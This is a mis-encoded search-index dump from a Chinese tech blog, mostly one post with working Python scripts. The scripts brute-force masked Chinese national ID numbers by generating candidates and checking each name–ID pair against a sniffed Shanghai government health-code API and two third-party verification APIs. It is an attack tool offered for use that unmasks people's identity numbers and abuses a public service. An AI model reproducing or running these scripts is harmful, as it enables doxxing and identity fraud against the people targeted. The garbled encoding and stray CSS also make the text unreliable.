-webkit-border-radius: 28; -moz-border-radius: 28; border-radius: 28px; text-shadow: 3px 2px 1px #9daef5; -webkit-box-shadow: 6px 5px 24px #666666; -moz-box-shadow: 6px 5px 24px #666666; box-shadow: 6px 5px 24px #666666; font-family: Arial; color: #fafafa; font-size: 5px; padding: 3px; text-decoration: none;&#125;.button:hover&#123; background:#2079b0 !important; /*:hover CSSä¼ªç±»,é¼ æ ‡æ‚¬åœæ•ˆæœ,è¿™é‡Œæ˜¯é¼ æ ‡æ”¾ä¸Šå»å°±å˜è‰²*/ background-image: -webkit-linear-gradient(top, #2079b0, #eb94d0); background-image: -moz-linear-gradient(top, #2079b0, #eb94d0); background-image: -ms-linear-gradient(top, #2079b0, #eb94d0); background-image: -o-linear-gradient(top, #2079b0, #eb94d0); background-image: linear-gradient(to bottom, #2079b0, #eb94d0); text-decoration: none;&#125;`)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"ç½‘è¯¾","slug":"ç½‘è¯¾","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E8%AF%BE/"}]},{"title":"èº«ä»½è¯äºŒè¦ç´ éªŒè¯","slug":"èº«ä»½è¯äºŒè¦ç´ éªŒè¯","date":"2022-08-17T09:03:17.000Z","updated":"2023-08-17T09:07:17.004Z","comments":true,"path":"2022/08/17/èº«ä»½è¯äºŒè¦ç´ éªŒè¯/","link":"","permalink":"http://blog.ioimp.top/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/","excerpt":"","text":"SfzVertifyèº«ä»½è¯äºŒè¦ç´ éªŒè¯â€‹ èº«ä»½è¯å·æ˜¯çš„ç¼–æ’æ˜¯æœ‰ä¸€å®šè§„å¾‹å¯å¾ªçš„ã€‚é™¤äº†æœ€å1ä½æ˜¯æ ¡éªŒä½å¤–ï¼Œå…¶ä½™å„ä½ä¸å‡ºç”Ÿåœ°ã€å‡ºç”Ÿæ—¥æœŸã€æ€§åˆ«ã€å‡ºç”Ÿç¼–å·æ¯æ¯ç›¸å…³ï¼Œå› æ­¤å³ä½¿æ˜¯ç»è„±æ•å¤„ç†çš„èº«ä»½è¯å·ï¼Œä»èƒ½é€šè¿‡ç¨‹åºåˆ†æçš„æ–¹å¼è¿‡æ»¤å‡ºå¯èƒ½çš„èº«ä»½è¯åºåˆ—ç»„åˆã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å‡ºç”Ÿåœ°ã€å‡ºç”Ÿæ—¥æœŸã€æ€§åˆ«ã€å‡ºç”Ÿç¼–å·è¿™äº›ä¿¡æ¯è¿›è¡Œèº«ä»½è¯çš„çŒœè§£ï¼Œä»è€Œå®ç°èº«ä»½è¯å·ç bp. è¿™ä¸ªAPIæ˜¯ä¸Šæµ·éšç”³åŠèº«ä»½è¯äºŒè¦ç´ æŠ“åŒ…æŠ“å‡ºæ¥çš„1234567891011121314151617181920212223242526272829303132def check(): url = &quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;X-Requested-With&quot;: &quot;com.tencent.mm&quot; &#125; pron_name=input(&quot;è¯·è¾“å…¥è¦éªŒè¯çš„åå­—ï¼š&quot;) print(&quot;è¿›è¡ŒäºŒè¦ç´ éªŒè¯ï¼Œè¯·è€å¿ƒç­‰å¾…..........&quot;) f = open(&quot;sfz.txt&quot;, &quot;r&quot;) lines = f.readlines() for line in lines: line = line.strip() data = &#123; &quot;name&quot;: f&quot;&#123;pron_name&#125;&quot;, &quot;id_card&quot;: line, &quot;mw&quot;: &quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot; &#125; try: r = requests.post(url, headers=headers, json=data).json() if (r[&#x27;code&#x27;] == 200): fok = open(&quot;successful.txt&quot;, &#x27;a+&#x27;) fok.write(line) fok.close print(line + &quot;|&quot; + str(r[&#x27;code&#x27;])) except Exception as e: fe = open(&quot;fail.txt&quot;, &#x27;a+&#x27;) fe.write(line) fe.close å…¶ä»–API1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import os, sys, requestsdef suishenma(name, idcard): url = &quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;X-Requested-With&quot;: &quot;com.tencent.mm&quot; &#125; data = &#123; &quot;name&quot;: name, &quot;id_card&quot;: str(idcard), &quot;mw&quot;: &quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot; &#125; try: r = requests.post(url, headers=headers, json=data) rescode = r.json()[&quot;code&quot;] if (rescode == 200): status = &quot;æ ¡éªŒæ­£ç¡®&quot; else: status = r.json()[&quot;message&quot;] print(&quot;ä¸Šæµ·éšç”³ç : &quot; + status) except Exception as e: passdef guyunge(name, idcard): url = &quot;https://api.guyunge.top/API/er.php&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;, &#125; data = &#123; &quot;name&quot;: name, &quot;card&quot;: str(idcard), &quot;type&quot;: &quot;json&quot; &#125; try: r = requests.post(url, headers=headers, data=data) rescode = r.json()[&quot;code&quot;] if (rescode == 1): status = &quot;æ ¡éªŒæ­£ç¡®&quot; else: status = r.json()[&quot;text&quot;] print(&quot;å­¤äº‘é˜API: &quot; + status) except Exception as e: passdef tingfengke(name, idcard): url = &quot;http://tc.tfkapi.top/API/eysjy.php&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;, &#125; data = &#123; &quot;name&quot;: name, &quot;num&quot;: str(idcard), &#125; try: r = requests.get(url, headers=headers, params=data).text if (r == &quot;æ ¡éªŒæˆåŠŸ-TFK&quot;): status = &quot;æ ¡éªŒæ­£ç¡®&quot; else: status = r print(&quot;å¬é£å®¢API: &quot; + status) except Exception as e: passif __name__ == &quot;__main__&quot;: suishenma(sys.argv[1], sys.argv[2]) guyunge(sys.argv[1], sys.argv[2]) tingfengke(sys.argv[1], sys.argv[2]) ä»£ç è¿›è¡Œæç¤º123456print(&quot;è¯·è¾“å…¥åŒºå·å¼€å§‹ã€ä¾‹ï¼š230101å“ˆå°”æ»¨å¸‚è¾–åŒºã€‘ï¼š&quot;) a_1 = int(input()) print(&quot;è¯·è¾“å…¥åŒºå·ç»“æŸã€ä¾‹ï¼šåŒºå·ç»“æŸ+1 230129+1å»¶å¯¿å¿ã€‘ï¼š&quot;) a_2 = int(input()) # åŒºå·ç»“æŸ+1 230129+1å»¶å¯¿å¿ print(&quot;è¯·è¾“å…¥å‡ºç”Ÿå¹´æœˆæ—¥:ã€19820606ã€‘&quot;) s = input() + &quot;****&quot; # ä¸¾ä¾‹ï¼šèº«ä»½è¯å·ç¼ºåå››ä½","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"ç½‘å®‰","slug":"ç½‘å®‰","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]}],"categories":[{"name":"å¼€å‘å¥‡é‡è®°","slug":"å¼€å‘å¥‡é‡è®°","permalink":"http://blog.ioimp.top/categories/%E5%BC%80%E5%8F%91%E5%A5%87%E9%81%87%E8%AE%B0/"},{"name":"å®ç”¨æŠ€å·§","slug":"å®ç”¨æŠ€å·§","permalink":"http://blog.ioimp.top/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"ç½‘ç«™æ­å»º","slug":"ç½‘ç«™æ­å»º","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"},{"name":"proxy","slug":"proxy","permalink":"http://blog.ioimp.top/categories/proxy/"}],"tags":[{"name":"Boilerpipe","slug":"Boilerpipe","permalink":"http://blog.ioimp.top/tags/Boilerpipe/"},{"name":"urlåœ°å€å˜è¿","slug":"urlåœ°å€å˜è¿","permalink":"http://blog.ioimp.top/tags/url%E5%9C%B0%E5%9D%80%E5%8F%98%E8%BF%81/"},{"name":"Stack Overflow","slug":"Stack-Overflow","permalink":"http://blog.ioimp.top/tags/Stack-Overflow/"},{"name":"ç£ç›˜åˆ†åŒº","slug":"ç£ç›˜åˆ†åŒº","permalink":"http://blog.ioimp.top/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"},{"name":"kali-linux","slug":"kali-linux","permalink":"http://blog.ioimp.top/tags/kali-linux/"},{"name":"ç½‘å®‰","slug":"ç½‘å®‰","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"},{"name":"æ¸—é€å¿…çŸ¥å¿…ä¼š","slug":"æ¸—é€å¿…çŸ¥å¿…ä¼š","permalink":"http://blog.ioimp.top/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"},{"name":"å®å¡”é¢æ¿","slug":"å®å¡”é¢æ¿","permalink":"http://blog.ioimp.top/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"},{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"å¤§æ•°æ®åˆ†æå¹³å°","slug":"å¤§æ•°æ®åˆ†æå¹³å°","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"},{"name":"clash","slug":"clash","permalink":"http://blog.ioimp.top/tags/clash/"},{"name":"ç½‘è¯¾","slug":"ç½‘è¯¾","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E8%AF%BE/"}]}